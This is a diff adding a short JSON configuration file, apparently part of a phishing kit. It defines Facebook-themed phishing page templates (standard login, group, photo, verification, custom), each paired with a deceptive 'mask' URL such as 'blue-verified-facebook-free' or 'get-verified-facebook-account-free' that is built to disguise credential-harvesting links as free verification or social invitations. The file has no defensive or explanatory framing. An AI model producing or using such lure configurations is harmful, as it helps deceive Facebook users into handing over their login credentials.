@@ -1,0 +1,32 @@
+[
+  {
+    "name": "Facebook Traditional",
+    "choice": "1",
+    "folder": "facebook",
+    "mask": "https://blue-verified-facebook-free"
+  },
+  {
+    "name": "Facebook Group",
+    "choice": "2",
+    "folder": "fb_group",
+    "mask": "https://join-our-comedy-group"
+  },
+  {
+    "name": "Facebook Photo",
+    "choice": "3",
+    "folder": "fb_photo",
+    "mask": "https://connect-with-others"
+  },
+  {
+    "name": "Facebook Verify",
+    "choice": "4",
+    "folder": "fb_verify",
+    "mask": "https://get-verified-facebook-account-free"
+  },
+  {
+    "name": "Custom",
+    "choice": "5",
+    "folder": "custom",
+    "mask": "custom"
+  }
+]
